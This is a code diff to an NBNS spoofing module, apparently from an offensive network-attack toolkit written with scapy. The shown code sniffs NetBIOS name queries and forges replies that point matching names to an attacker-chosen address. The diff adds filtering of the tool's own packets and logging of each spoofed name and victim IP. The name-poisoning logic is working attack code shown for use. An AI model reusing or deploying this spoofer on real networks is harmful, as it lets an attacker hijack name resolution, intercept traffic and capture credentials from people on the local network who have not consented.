@@ -16,6 +16,7 @@ class NBNSSpoof:
 		self.regex_match = None
 		self.redirect = None
 		self.running = False
+		self.dump = False
 
 	#
 	# callback for packets; match 
@@ -24,13 +25,14 @@ class NBNSSpoof:
 		if pkt.haslayer(NBNSQueryRequest):
 			request = pkt[NBNSQueryRequest].getfieldval('QUESTION_NAME')
 			ret = self.regex_match.search(request)
-			if not ret.group(0) is None: 
+			if not ret.group(0) is None and pkt[Ether].dst != self.local_mac and pkt[IP].src != util.get_local_ip(conf.iface): 
 				trans_id = pkt[NBNSQueryRequest].getfieldval('NAME_TRN_ID')
 				response = Ether(dst=pkt[Ether].src, src=self.local_mac)
 				response /= IP(dst=pkt[IP].src)/UDP(sport=137,dport=137)
 				response /= NBNSQueryResponse(NAME_TRN_ID=trans_id, RR_NAME=request, NB_ADDRESS=self.redirect)
 				del response[UDP].chksum # recalc checksum
 				sendp(response)	# layer 2 send for performance
+				if self.dump: util.Msg('Spoofing \'%s\' from %s'%(request.strip(), pkt[IP].src))
 
 	def initialize(self):
 		while True:
@@ -67,6 +69,14 @@ class NBNSSpoof:
 			return False
 		util.debug('nbns spoofer shutdown')
 		return True
+
+	def view(self):
+		try:
+			while True:
+				self.dump = True
+		except KeyboardInterrupt:
+			self.dump = False
+			return
 
 	#
 	# callback shutdown
